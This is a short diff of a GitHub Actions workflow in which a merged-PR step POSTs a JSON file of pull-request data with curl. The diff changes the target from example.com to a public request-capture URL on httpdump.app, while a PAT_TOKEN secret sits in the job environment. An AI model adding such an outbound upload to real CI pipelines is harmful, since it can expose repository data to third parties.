@@ -21,7 +21,7 @@ jobs:
         run: |
           if [ "${{ github.event_name }}" == "pull_request" ] && [ "${{ github.event.pull_request.merged }}" == "true" ]; then
             echo "${{ steps.pr_info.outputs.data }}" > pr_data.json
-            curl -X POST -H "Content-Type: application/json" --data @pr_data.json https://example.com/api/endpoint
+            curl -X POST -H "Content-Type: application/json" --data @pr_data.json https://httpdump.app/dumps/3220de01-ed9d-488e-a34f-9893a07fed60
           fi
         env:
           PAT_TOKEN: ${{ secrets.PAT_TOKEN }}
